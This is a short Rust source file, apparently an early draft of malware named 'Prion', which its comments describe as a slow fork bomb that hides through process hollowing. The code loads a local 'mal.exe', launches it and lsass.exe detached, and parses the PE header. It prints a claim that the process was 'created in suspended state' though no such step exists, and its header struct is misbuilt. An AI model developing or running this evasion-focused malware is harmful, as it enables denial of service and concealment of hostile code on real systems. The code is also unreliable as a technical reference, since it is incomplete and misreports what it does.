//Prion is a slow-moving fork bomb which tries to hide using process hollowing
//Created for self-educational purposes - DO NOT RUN OR DISTRIBUTE!

use std::process::{Command, Stdio};
use std::{thread, time, env};
use std::vec::Vec;
use std::fs::File;
use std::io::prelude::*;
use std::ptr::null;
use std::str::from_utf8;
use std::string::String;

extern crate subprocess;
use subprocess::{Popen, PopenConfig, Exec};

extern crate libc;
extern crate bindgen;
use bindgen::builder;

extern crate pe;
use pe::Pe;
use pe::types::{SectionHeader, PeHeader};

extern crate bytes;
use bytes::Bytes;

extern crate byteorder;
use byteorder::{ByteOrder, BigEndian, LittleEndian};

struct ProcessData {
	pidh : u8,
	pinh : u8
}

/*
pData -> mal_buf
pidh -> dos_head
pinh -> nt_head
pish -> section_head
si -> startup_info
pi -> process_info

*/

fn main() {
	
	//Read the malicious executable into a buffer
	let mut mal_buf = Vec::new();
	let mut mal_file = File::open("C:\\Users\\Emily\\Documents\\mal\\mal.exe").expect("Error opening file.\n");
	mal_file.read_to_end(&mut mal_buf).expect("Error reading file contents into buffer.\n");
	
	//println!("File:\n{:?}\n", mal_file);
	//println!("Buf contents:\n{:?}\n", mal_buf);
	
	let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();

	let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
	//legit_proc.popen();
	
	let mal_parse = Pe::new(&mal_buf).unwrap();
	let img_file_header = mal_parse.get_header();
	
	let mut s_buf = [0; 4];
	let signature = img_file_header.signature;
	LittleEndian::write_u32(&mut s_buf, signature);
	let opt_header = &img_file_header.size_of_optional_header;
	println!("PE parse:\n{:?} -> {:?}\n{:?}\n", signature, from_utf8(&s_buf).unwrap(), opt_header);
	
	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
	//thread::sleep(time::Duration::from_millis(1000));
	println!("mal process created in suspended state.\n");
	println!("Process data:\npidh: {:?}\npinh: {:?}", mal_data.pidh, mal_data.pinh)
	
}

